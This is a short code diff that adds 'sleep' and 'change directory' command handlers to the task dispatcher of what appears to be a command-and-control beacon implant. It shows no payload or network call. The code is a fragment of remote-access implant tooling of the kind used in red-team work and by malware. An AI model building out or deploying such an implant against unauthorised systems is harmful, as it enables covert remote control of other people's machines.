@@ -2,6 +2,7 @@
 
 #include "beacon.h"
 #include "command.h"
+#include "filesystem.h"
 #include "self.h"
 #include "spawn.h"
 
@@ -17,6 +18,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_DIE:
 			Die();
+			break;
+		case COMMAND_SLEEP:
+			SleepSet(buffer, size);
+			break;
+		case COMMAND_CD:
+			FilesystemCd(buffer, size);
 			break;
 	}
 }
